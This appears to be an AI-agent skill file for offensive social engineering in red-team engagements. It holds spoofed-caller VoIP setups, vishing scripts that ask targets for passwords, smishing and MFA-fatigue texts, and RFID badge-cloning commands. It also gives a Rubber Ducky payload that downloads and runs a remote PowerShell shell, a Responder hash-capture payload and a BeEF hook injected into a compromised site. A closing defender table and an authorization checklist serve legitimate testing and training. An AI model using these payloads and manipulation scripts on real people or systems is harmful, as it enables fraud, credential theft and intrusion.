---
name: offensive-social-engineering
description: "Social engineering attack techniques beyond email phishing for authorized red team and physical penetration testing engagements. Covers pretexting methodology (persona creation, authority and urgency psychological triggers, rapport building), vishing (voice phishing via caller ID spoofing, IVR system exploitation, VoIP infrastructure setup with Twilio/Asterisk), smishing (SMS-based phishing, carrier gateway abuse, short code impersonation), physical social engineering (tailgating and piggybacking, RFID badge cloning with Proxmark3, lock picking and bypass, dumpster diving for sensitive documents), USB drop attacks (Rubber Ducky keystroke injection, Bash Bunny multi-vector payloads, O.MG cable covert implants, BadUSB firmware attacks), watering hole attack planning and execution, and OSINT-driven targeting (LinkedIn harvesting, organizational chart reconstruction, employee pattern analysis). Integrates with the Social Engineering Toolkit for attack automation, Proxmark3 for RFID/NFC cloning, USB Rubber Ducky and Bash Bunny for physical payload delivery, and BeEF for browser exploitation. Maps to MITRE ATT&CK T1598 (Phishing for Information), T1566 (Phishing), T1091 (Replication Through Removable Media), and T1189 (Drive-by Compromise). All techniques require explicit written authorization and defined rules of engagement."
---

# Offensive Social Engineering

Social engineering exploits human trust, authority bias, and procedural gaps rather than technical vulnerabilities. While phishing is the most common vector, a comprehensive red team engagement tests the full spectrum: voice calls, text messages, physical access, and planted devices. You are simulating an adversary who combines OSINT, psychological manipulation, and physical access techniques to breach an organization's defenses at the human layer.

Every technique described here requires explicit written authorization. Physical social engineering carries additional legal considerations -- trespassing, impersonation of officials, and recording laws vary by jurisdiction. Confirm your scope covers each vector before execution.

## Quick Workflow

1. Conduct OSINT to map the target organization's structure, key personnel, physical locations, and communication patterns.
2. Develop personas and pretexts tailored to the engagement objectives (credential theft, physical access, data exfiltration).
3. Prepare infrastructure: VoIP numbers for vishing, SMS gateways for smishing, cloned badges for physical access.
4. Execute attacks in phases -- start with remote vectors (vishing, smishing), escalate to physical if in scope.
5. Document every interaction with timestamps, recordings (where legally permitted), and outcomes.
6. Debrief with the client; provide actionable recommendations for security awareness and procedural improvements.

---

## Pretexting and Psychological Manipulation

Pretexting is the foundation of all social engineering. You construct a believable scenario that gives you a reason to request information or access. The pretext must hold up under casual scrutiny and, for high-value targets, under deliberate verification.

### Persona Development

Build a persona with enough depth to answer follow-up questions. A thin pretext collapses under the first challenge.

```text
Persona Template:
  Name:           [Realistic for the region and industry]
  Role:           [IT support, vendor account manager, building inspector]
  Organization:   [Real vendor the target uses, or plausible third party]
  Contact Info:   [Burner phone, spoofed email, LinkedIn profile]
  Backstory:      [Why you are calling/visiting today]
  Verification:   [What to say if they try to verify your identity]
  Fallback:       [Graceful exit if the pretext fails]

Example -- IT Support Persona:
  Name:           Mark Chen
  Role:           Senior Support Engineer, Contoso IT Services
  Backstory:      Contoso manages the target's endpoint security.
                  Calling about a critical vulnerability patch that
                  requires the user to verify their credentials on
                  a portal to receive the update.
  Verification:   "You can check our contract reference CON-2024-0847
                  with your procurement team."
  Fallback:       "No problem, I will have your account manager
                  Sarah reach out to coordinate instead."
```

### Psychological Triggers

Effective social engineering leverages cognitive biases. You apply these deliberately, not randomly.

```text
Authority:
  - Impersonate someone with organizational power (CISO, VP, auditor)
  - Reference internal projects or systems by name
  - Use confident, directive language

Urgency / Scarcity:
  - "This must be resolved before end of business today"
  - "Your account will be locked if we cannot verify now"
  - Artificial deadlines compress the target's decision-making time

Social Proof:
  - "I have already confirmed this with your colleague [name]"
  - "Everyone in your department has completed this step"

Reciprocity:
  - Offer help before making a request ("I fixed that ticket for you")
  - Small favors create obligation

Commitment / Consistency:
  - Get the target to agree to small requests first
  - Escalate to the actual objective after initial compliance

Liking / Rapport:
  - Mirror the target's communication style
  - Find common ground (shared frustrations, industry knowledge)
  - Use their name; reference specifics from OSINT
```

---

## Vishing (Voice Phishing)

Voice calls add a human element that email cannot replicate. The real-time interaction lets you adapt, overcome objections, and build trust dynamically.

### VoIP Infrastructure Setup

Set up a dedicated voice infrastructure that supports caller ID spoofing and call recording.

```bash
# Option 1: Twilio for caller ID manipulation
# Register a Twilio account and purchase a local number

pip install twilio

python3 <<'PYEOF'
from twilio.rest import Client

account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
auth_token = "your_auth_token"
client = Client(account_sid, auth_token)

# Place a call with spoofed caller ID
call = client.calls.create(
    to="+1XXXXXXXXXX",        # Target number
    from_="+1XXXXXXXXXX",     # Your Twilio number (displayed)
    url="http://your-server.com/twiml/pretext.xml"  # TwiML script
)
print(f"Call SID: {call.sid}")
PYEOF

# TwiML script for IVR-style pretext
cat <<'XML' > pretext.xml
<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="alice">
        This is an automated message from your IT security team.
        A suspicious login was detected on your account.
        Press 1 to verify your identity and secure your account.
    </Say>
    <Gather numDigits="1" action="/handle-key" method="POST">
        <Say>Press 1 now.</Say>
    </Gather>
</Response>
XML
```

```bash
# Option 2: Asterisk PBX for full control
# Install Asterisk on a VPS
apt-get install asterisk

# Configure a SIP trunk with a VoIP provider that permits
# caller ID passthrough (check provider TOS for compliance)

# extensions.conf -- route outbound calls with custom CallerID
cat <<'CONF' >> /etc/asterisk/extensions.conf
[outbound-spoof]
exten => _X.,1,Set(CALLERID(num)=2125551234)
exten => _X.,n,Set(CALLERID(name)=TargetCorp IT)
exten => _X.,n,Dial(SIP/trunk/${EXTEN})
exten => _X.,n,Hangup()
CONF

asterisk -rx "dialplan reload"
```

### Vishing Call Scripts

Prepare a script but deliver it conversationally. Reading from a script verbatim sounds robotic and raises suspicion.

```text
Opening:
  "Hi, this is Mark from IT support. Am I speaking with [target name]?
   Great -- I am calling because we detected some unusual activity
   on your account this morning and I need to verify a few things
   with you to get it resolved."

Credential Harvesting:
  "I have pulled up your account and I can see the flagged activity.
   To confirm your identity before I can make any changes, could you
   verify the email address on file? ... And the password you are
   currently using, so I can confirm it was not changed by the
   unauthorized party?"

Objection Handling:
  Target: "I should not give my password over the phone."
  Response: "Absolutely, I understand the concern. What I can do
   instead is send you a secure link to reset it. Can you confirm
   the email I should send that to? I will stay on the line while
   you complete it."
   [Send EvilGinx2 link via email during the call]

Escalation to Manager:
  "If you would prefer, I can have my supervisor call you back.
   Let me transfer you to our team lead."
   [Transfer to another operator playing the supervisor role]
```

### IVR System Exploitation

Interactive Voice Response systems often have hidden administrative menus, default PINs, or DTMF-accessible functions.

```text
Common IVR reconnaissance:
  - Dial the main number and explore all menu options
  - Try pressing 0, #, or * at any prompt for operator/admin access
  - Enter default PINs: 0000, 1234, 9999, the last four of the main number
  - Listen for system identification (Cisco Unity, Avaya, Mitel)
  - Check for voicemail systems accessible via external dial-in
  - Test for DTMF injection during hold music or transfer sequences
```

---

## Smishing (SMS Phishing)

SMS messages have higher open rates than email and are harder for organizations to filter. Carrier-level protections are improving but remain inconsistent.

### SMS Gateway Setup and Delivery

```python
# Twilio SMS with link tracking
from twilio.rest import Client

client = Client("ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX", "auth_token")

targets = [
    ("+1XXXXXXXXXX", "John"),
    ("+1XXXXXXXXXX", "Sarah"),
]

for number, name in targets:
    message = client.messages.create(
        body=f"Hi {name}, your VPN certificate expires today. "
             f"Renew now to avoid losing access: "
             f"https://vpn-targetcorp.com/renew?u={name.lower()}",
        from_="+1XXXXXXXXXX",  # Your Twilio number
        to=number
    )
    print(f"Sent to {name}: {message.sid}")
```

### Smishing Pretext Patterns

```text
IT / Security:
  "TargetCorp Security Alert: Unusual login detected from
   [city]. Verify your identity: https://secure-targetcorp.com/verify"

HR / Benefits:
  "[TargetCorp] Open enrollment deadline extended to Friday.
   Review your benefits selections: https://benefits-portal.com/enroll"

Delivery / Package:
  "USPS: Your package requires address confirmation before
   delivery. Confirm here: https://usps-verify.com/confirm"

MFA Push Fatigue (combined with credential stuffing):
  Send repeated MFA push notifications, then SMS:
  "TargetCorp IT: We are seeing repeated MFA prompts on your
   account. If this is not you, approve the next prompt so we
   can reset and secure your account."
```

---

## Physical Social Engineering

Physical penetration testing requires you to bypass guards, locks, badge readers, and human vigilance to access restricted areas.

### Tailgating and Piggybacking

The simplest physical access technique. You follow an authorized person through a controlled entry point.

```text
Tailgating Approaches:
  - Hands full: Carry boxes, a laptop bag, and coffee. People
    hold doors for someone whose hands are full.
  - Smoking area: Join employees at the smoking area and walk
    back in with them. No badge tap needed.
  - Delivery persona: Wear a delivery uniform, carry a package
    addressed to someone inside. "I just need to drop this off."
  - Timing: Enter during high-traffic periods (8:30-9:00 AM,
    lunch return at 1:00 PM) when door-holding is routine.

Physical Appearance:
  - Dress code matters. Match the environment.
  - Corporate office: Business casual, lanyard with a badge
    (even a blank one -- people see the lanyard, not the badge).
  - Data center: Polo shirt, cargo pants, tool belt.
  - Construction/maintenance: Hi-vis vest, hard hat, clipboard.
```

### RFID Badge Cloning with Proxmark3

Most access control systems use low-frequency (125 kHz) proximity cards that are trivially cloneable. Higher-frequency systems (13.56 MHz) require more effort but are still vulnerable.

```bash
# Proxmark3 -- Read a low-frequency HID ProxCard
proxmark3> lf hid read
# Output: TAG ID: 2004XXXXXXXX

# Clone to a T5577 writable card
proxmark3> lf hid clone -r 2004XXXXXXXX

# For iCLASS (high-frequency) systems
proxmark3> hf iclass read
# May require key recovery:
proxmark3> hf iclass loclass
# Then clone with recovered keys

# For MIFARE Classic (common in many badge systems)
proxmark3> hf mf autopwn
# Dumps all sectors; clone to a MIFARE Classic compatible card
proxmark3> hf mf cload -f dump.eml
```

```text
Badge Capture Techniques:
  - Long-range reader: Place a concealed reader near an entry
    point or elevator. Low-frequency cards can be read at 1-3
    feet without the cardholder's knowledge.
  - Social approach: "Hey, can I see your badge for a second?
    I think we have the same model and mine stopped working."
  - Photography: Badge numbers are sometimes printed on the
    face of the card. A telephoto lens from across a parking
    lot can capture them.
```

### Lock Picking and Physical Bypass

```text
Common Bypass Methods:
  - Lock picking: Rake or single-pin pick standard pin tumbler
    locks. Most commercial door locks are pickable in under
    60 seconds with practice.
  - Bump keys: Pre-cut keys that open pin tumbler locks via
    percussive force. Fast and low-skill.
  - Shims: Bypass padlocks by inserting a thin metal shim
    between the shackle and the locking mechanism.
  - Under-door tools: Slide a tool under the door to reach
    the interior handle or push bar. Works on outward-opening
    doors with gaps.
  - REX sensor triggering: Request-to-exit motion sensors can
    often be triggered through glass doors with a can of
    compressed air (simulates heat) or by reaching through
    gaps with a wire.
  - Elevator manipulation: Many elevator control panels use
    standard fire service keys (FEO-K1 is near-universal in
    the US). Carry one.
```

---

## USB Drop Attacks

Weaponized USB devices exploit human curiosity and the implicit trust users place in physical media.

### USB Rubber Ducky

The Rubber Ducky appears as a keyboard to the target system and executes pre-programmed keystrokes at machine speed.

```text
# DuckyScript payload -- reverse shell via PowerShell
# Saved as inject.bin on the Rubber Ducky microSD

DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('https://cdn.attacker.com/shell.ps1'))"
ENTER
DELAY 100
```

### Bash Bunny

The Bash Bunny is a multi-function USB attack platform that can emulate storage, keyboard, and Ethernet simultaneously.

```bash
# Bash Bunny payload -- credential harvesting via Responder
# payload.txt in switch position 1

ATTACKMODE ECM_ETHERNET HID
LED SETUP

# Wait for network interface
QUACK DELAY 3000

# Start Responder on the Bash Bunny's network interface
python3 /tools/responder/Responder.py -I usb0 -wrfb &

# Wait for hashes
LED ATTACK
sleep 60

# Exfiltrate captured hashes
LED CLEANUP
cp /tools/responder/logs/* /root/udisk/loot/
LED FINISH

sync
```

### O.MG Cable

The O.MG cable is visually indistinguishable from a standard USB charging cable but contains a wireless implant capable of keystroke injection, keylogging, and remote command execution.

```text
O.MG Deployment Scenarios:
  - Replace a charging cable at the target's desk during a
    physical assessment. The cable charges the device normally
    while providing covert access.
  - Leave "branded" cables in common areas: conference rooms,
    reception desks, break rooms.
  - Mail a cable to the target as a "promotional gift" or
    "replacement for a recalled product."

O.MG Capabilities:
  - Keystroke injection (like Rubber Ducky, but wireless trigger)
  - Keylogging (captures everything typed through the cable)
  - Wi-Fi command and control (connect to the implant's AP)
  - Geofencing (auto-trigger payloads based on Wi-Fi proximity)
  - Self-destruct (wipe payload remotely)
```

---

## Watering Hole Attacks

Instead of attacking the target directly, compromise a website the target frequently visits. This is particularly effective against security-conscious organizations that are resistant to direct phishing.

### Watering Hole Methodology

```text
1. Identify target browsing habits via OSINT:
   - Industry forums and blogs
   - Vendor portals and documentation sites
   - Regional news sites popular with the target demographic
   - Professional association websites

2. Assess candidate sites for vulnerabilities:
   - XSS (inject malicious JavaScript without full compromise)
   - CMS vulnerabilities (WordPress, Drupal, Joomla)
   - Third-party widget compromise (analytics, chat, ads)

3. Deploy selective exploitation:
   - Serve exploits only to IP ranges belonging to the target org
   - Use browser fingerprinting to target specific OS/browser combos
   - Redirect to benign content for non-target visitors

4. Example: Inject BeEF hook into a compromised industry blog
```

```javascript
// BeEF hook injection on a compromised watering hole site
// Injected into the site's footer or a third-party JS include
// Targets only the victim organization's IP range

(function() {
    var targetRanges = ["203.0.113.", "198.51.100."];
    // IP check via WebRTC or server-side logic
    // If target IP matches, load BeEF hook:
    var s = document.createElement("script");
    s.src = "https://attacker-beef.com/hook.js";
    document.body.appendChild(s);
})();
```

---

## OSINT for Targeting

Effective social engineering starts with intelligence gathering. The more you know about the target, the more convincing your pretexts.

### LinkedIn and Organizational Reconnaissance

```bash
# LinkedIn scraping for employee enumeration
# Use linkedin2username for email format derivation
python3 linkedin2username.py -u user@email.com -c "TargetCorp" -s 1000

# theHarvester for multi-source OSINT
theHarvester -d targetcorp.com -b all -l 500

# Recon-ng for structured intelligence gathering
recon-ng
[recon-ng] > marketplace install all
[recon-ng] > modules load recon/companies-contacts/bing_linkedin_cache
[recon-ng] > options set SOURCE "TargetCorp"
[recon-ng] > run

# CrossLinked for LinkedIn enumeration without API
python3 crosslinked.py -f '{first}.{last}@targetcorp.com' "TargetCorp"
```

### Organizational Pattern Analysis

```text
Map the organization to identify:

  Reporting Structure:
    - Who reports to whom (LinkedIn, press releases, org charts)
    - Key decision-makers and their assistants
    - New hires (less likely to question unusual requests)

  Communication Patterns:
    - Internal tools (Slack, Teams, Zoom -- visible in job postings)
    - Vendor relationships (partner pages, case studies)
    - Email format (first.last, flast, firstl -- verify via SMTP)

  Physical Security:
    - Office locations (Google Maps, Street View for entry points)
    - Badge type (photos on social media, Glassdoor)
    - Visitor procedures (call the front desk and ask)
    - Delivery schedules (observe loading docks)

  Technology Stack:
    - Job postings reveal internal tools and infrastructure
    - DNS records, SSL certificates, Shodan results
    - GitHub/GitLab public repositories from employees
```

---

## Detection / Defender View

| Attack Vector | Detection Indicators | Defensive Countermeasure |
|---|---|---|
| Vishing | Unusual caller ID, caller requests credentials, cannot verify identity through callback | Callback verification policy, never share credentials by phone, security word system |
| Smishing | Unknown sender, URL in SMS, urgency language, mismatched sender name | SMS filtering, user awareness training, never click SMS links for corporate actions |
| Tailgating | Unfamiliar face, no visible badge, following closely through doors | Mantrap/airlock entries, security cameras, challenge culture training |
| Badge cloning | Duplicate badge reads at different locations, access outside normal hours | Multi-factor physical access (badge + PIN), anomaly detection on access logs |
| USB drops | Unknown USB device inserted, new HID device enumerated, unusual keystrokes | Disable USB ports via GPO, USB device whitelisting, endpoint detection for HID attacks |
| Watering hole | Unexpected browser exploit attempts, beacon traffic to unknown C2 | Web proxy with TLS inspection, browser isolation, network segmentation |

Defenders should implement a "trust but verify" culture: every unusual request should be verified through an independent channel, not the one the requestor provides.

---

## Engagement Cheatsheet

```text
PRE-ENGAGEMENT
  [ ] Written authorization covers all planned vectors (vishing, physical, USB)
  [ ] Legal review of jurisdiction-specific laws (recording consent, trespass)
  [ ] Rules of engagement define escalation limits and safety words
  [ ] Personas and pretexts developed and rehearsed
  [ ] Infrastructure ready: VoIP numbers, SMS gateway, cloned badges, USB devices
  [ ] Emergency contact list (client POC, legal, physical safety)

EXECUTION - REMOTE
  [ ] Vishing calls recorded (where legally permitted) with timestamps
  [ ] Smishing messages sent and tracked
  [ ] All credential captures documented immediately
  [ ] Stop criteria monitored (do not exceed authorized scope)

EXECUTION - PHYSICAL
  [ ] Carry authorization letter at all times during physical assessment
  [ ] Photograph or video evidence of access achieved (where permitted)
  [ ] Do not damage property, alarm occupants, or create safety hazards
  [ ] If challenged and pretext fails, present authorization letter immediately
  [ ] Log entry/exit times for every facility accessed

POST-ENGAGEMENT
  [ ] All planted devices (USB, O.MG cables) recovered or accounted for
  [ ] Cloned badges destroyed
  [ ] VoIP numbers and SMS accounts decommissioned
  [ ] Findings compiled: what worked, what was caught, what was missed
  [ ] Recommendations: procedural controls, awareness training, physical upgrades
```

---

## Key References

- MITRE ATT&CK T1598 -- Phishing for Information
- MITRE ATT&CK T1566 -- Phishing
- MITRE ATT&CK T1091 -- Replication Through Removable Media
- MITRE ATT&CK T1189 -- Drive-by Compromise
- Social Engineering Toolkit (SET) -- https://github.com/trustedsec/social-engineer-toolkit
- Proxmark3 -- https://github.com/RfidResearchGroup/proxmark3
- Hak5 USB Rubber Ducky -- https://docs.hak5.org/hak5-usb-rubber-ducky
- Hak5 Bash Bunny -- https://docs.hak5.org/bash-bunny
- O.MG Cable -- https://o.mg.lol
- BeEF Framework -- https://beefproject.com
- linkedin2username -- https://github.com/initstring/linkedin2username
- CrossLinked -- https://github.com/m8sec/CrossLinked
- Christopher Hadnagy, "Social Engineering: The Science of Human Hacking"
